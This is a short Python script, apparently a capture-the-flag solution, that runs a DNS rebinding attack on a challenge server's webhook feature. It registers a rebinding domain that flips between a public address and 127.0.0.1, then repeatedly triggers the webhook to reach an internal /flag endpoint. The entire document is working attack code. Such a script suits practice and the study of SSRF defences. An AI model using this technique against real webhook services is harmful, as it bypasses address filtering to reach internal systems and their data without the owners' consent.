import requests
import sys

TARGET = 'http://chall.0xfun.org:46473'
# 7f000001 = 127.0.0.1, 8efab5ae = 142.250.181.174 (public)
REBIND_DOMAIN = '7f000001.8efab5ae.rbndr.us'
WEBHOOK_URL = f'http://{REBIND_DOMAIN}:5001/flag'

print(f'[*] Webhook URL: {WEBHOOK_URL}')
print(f'[*] Starting DNS rebinding attack...')

for attempt in range(300):
    try:
        r = requests.post(f'{TARGET}/register', data={'url': WEBHOOK_URL}, timeout=5)
        if r.status_code != 200:
            if attempt % 20 == 0:
                print(f'[{attempt}] Registration blocked')
            continue
        webhook_id = r.json()['id']
        print(f'[{attempt}] Registered: {webhook_id}')
    except:
        continue

    for t in range(20):
        try:
            r2 = requests.post(f'{TARGET}/trigger', data={'id': webhook_id}, timeout=5)
            body = r2.text
            if any(x in body for x in ['{', 'flag', 'FLAG', '0xfun']):
                print(f'\n[!!!] FLAG: {body}')
                sys.exit(0)
            if r2.status_code == 200:
                print(f'  trigger {t}: {body[:200]}')
        except:
            pass

print('[*] No flag found')
